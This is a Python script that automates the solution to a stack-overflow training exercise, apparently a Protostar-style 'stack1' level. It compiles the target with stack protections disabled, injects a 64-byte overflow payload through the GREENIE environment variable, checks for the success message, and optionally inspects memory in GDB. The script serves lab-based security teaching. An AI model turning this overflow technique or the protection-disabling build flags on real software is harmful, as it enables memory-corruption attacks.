#!/usr/bin/env python3
"""
stack1 automation helper (Python 3.4+ friendly)

- Builds ./stack1 from stack.1.c if missing (requires gcc)
- Sets GREENIE to the overflow payload
- Runs the binary and checks for the success string
- Optionally runs a non-interactive GDB batch (inherits the same GREENIE env)
"""

import argparse
import os
import stat
import subprocess
import sys
import tempfile
from pathlib import Path


SUCCESS_LINE = "you have correctly modified the variable"


def here():
    return Path(__file__).resolve().parent


def ensure_executable(p):
    st = p.stat()
    if st.st_mode & stat.S_IXUSR:
        return
    p.chmod(st.st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)


def which(cmd):
    paths = os.environ.get("PATH", "").split(os.pathsep)
    for d in paths:
        p = str(Path(d) / cmd)
        if os.path.exists(p) and os.access(p, os.X_OK):
            return p
    return None


def run_capture(argv, stdin_bytes=None, env=None):
    p = subprocess.Popen(
        argv,
        stdin=subprocess.PIPE if stdin_bytes is not None else None,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        env=env,
    )
    out, _ = p.communicate(stdin_bytes)
    try:
        out_s = out.decode("utf-8", "replace")
    except Exception:
        out_s = str(out)
    return p.returncode, out_s


def payload_bytes():
    # We want modified == 0x0d0a0d0a which is bytes: 0a 0d 0a 0d (little-endian).
    # Keep the offset robust by defaulting to 64 (works for this source layout),
    # and allow override via STACK1_OFFSET env var.
    try:
        off = int(os.environ.get("STACK1_OFFSET", "64"))
    except Exception:
        off = 64
    return b"A" * off + b"\x0a\x0d\x0a\x0d"


def greenie_value(payload):
    # Preserve raw bytes in env by mapping 0x00-0xff directly to Unicode code points.
    # (No NUL bytes in this payload.)
    return payload.decode("latin-1")


def maybe_build(binary, source):
    if binary.exists():
        return True
    cc = which("gcc")
    if not cc:
        sys.stderr.write("[!] Missing ./stack1 and gcc not found; cannot build.\n")
        return False
    cmd = [
        cc,
        "-g",
        "-fno-stack-protector",
        "-z",
        "execstack",
        "-no-pie",
        "-o",
        str(binary),
        str(source),
    ]
    rc, out = run_capture(cmd)
    sys.stdout.write(out)
    return rc == 0 and binary.exists()


def gdb_script(binary):
    # Break after strcpy returns (main+0x60 in this build) to inspect modified.
    return "\n".join(
        [
            "set pagination off",
            "set confirm off",
            "set disassembly-flavor intel",
            "file " + str(binary),
            "break main",
            "run",
            "printf \"\\n[+] &buffer  = %p\\n\", &buffer",
            "printf \"[+] &modified= %p\\n\", &modified",
            "printf \"[+] (difference) = %ld bytes\\n\", (char*)&modified - (char*)&buffer",
            "break *main+0x60",
            "continue",
            "printf \"\\n[+] After strcpy()\\n\"",
            "info registers rbp rsp",
            "x/wx $rbp-0xc",
            "x/96bx $rbp-0x60",
            "quit",
            "",
        ]
    )


def run_gdb(binary, env):
    script = gdb_script(binary)
    with tempfile.NamedTemporaryFile("w", prefix="stack1-gdb-", suffix=".gdb", delete=False) as f:
        f.write(script)
        script_path = f.name
    try:
        return run_capture(["gdb", "-q", "-nx", "-batch", "-x", script_path], env=env)
    finally:
        try:
            os.unlink(script_path)
        except OSError:
            pass


def main():
    ap = argparse.ArgumentParser(description="Automate stack1 analysis + solve.")
    ap.add_argument("--binary", default="stack1", help="Path to stack1 binary (default: ./stack1)")
    ap.add_argument("--no-gdb", action="store_true", help="Skip the GDB batch analysis")
    ap.add_argument("--no-build", action="store_true", help="Do not attempt to build stack1 if missing")
    args = ap.parse_args()

    binary = Path(args.binary)
    if not binary.is_absolute():
        binary = (here() / binary.as_posix()).resolve()

    source = (here() / "stack.1.c").resolve()

    if not binary.exists():
        if args.no_build:
            sys.stderr.write("ERROR: binary not found: {0}\n".format(binary))
            return 2
        if not maybe_build(binary, source):
            return 2

    ensure_executable(binary)

    payload = payload_bytes()
    env = os.environ.copy()
    env["GREENIE"] = greenie_value(payload)

    print("[+] Running: {0} with GREENIE len={1}".format(binary.name, len(payload)))
    rc, out = run_capture([str(binary)], env=env)
    sys.stdout.write(out)
    if not out.endswith("\n"):
        sys.stdout.write("\n")

    if SUCCESS_LINE not in out:
        sys.stderr.write("[!] Did not observe success message.\n")
        sys.stderr.write("[!] Program output suggests modified != 0x0d0a0d0a.\n")
        return 1

    print("[+] Success: modified == 0x0d0a0d0a")

    if args.no_gdb:
        return 0

    if not which("gdb"):
        print("[!] gdb not found; skipping GDB batch. Install with: sudo apt-get install -y gdb")
        return 0

    print("\n[+] Running non-interactive GDB batch (inherits GREENIE).")
    gdb_rc, gdb_out = run_gdb(binary, env)
    sys.stdout.write(gdb_out)
    if not gdb_out.endswith("\n"):
        sys.stdout.write("\n")
    if gdb_rc != 0:
        sys.stderr.write("[!] GDB exited non-zero: {0}\n".format(gdb_rc))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

